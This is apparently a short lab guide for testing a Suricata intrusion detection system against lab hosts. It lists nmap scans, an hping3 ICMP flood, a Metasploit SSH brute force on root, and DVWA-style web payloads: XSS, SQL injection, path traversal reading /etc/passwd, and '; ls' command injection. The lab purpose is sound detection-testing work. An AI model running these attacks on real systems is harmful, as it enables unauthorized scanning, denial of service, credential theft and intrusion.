# Lab Suricata - Tests IDS
## 1. Network-Based Attacks

### NMAP TCP SYN Scan :
```bash
nmap -sS 192.168.100.10
```

### NMAP UDP SCAN :
```bash
nmap -sU 192.168.100.10
```

### ICMP Flood :
```bash
sudo hping3 -1 --flood 192.168.100.10
```

### Tunnel ICMP :
```bash
ping -s 2000 192.168.100.10   
```

### SSH bruteforce :
```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.100.12
set USERNAME root
set PASSWORD /usr/share/wordlists/rockyou.txt
run
```

## 2. Web-based



### XSS (Cross-Site Scripting)
```bash
<script>alert("test")</script>

```

### SQL Injection
```bash
http://192.168.100.10/vulnerabilities/sqli/?id=1' OR 1=1#&Submit=Submit

```

### Directory Traversal
```bash
http://192.168.100.10/vulnerabilities/fi/?page=../../../../etc/passwd

```

### File Inclusion
```bash
http://192.168.100.10/vulnerabilities/fi/?page=../../../../etc/passwd

```

### Command Injection
```bash
; ls
```
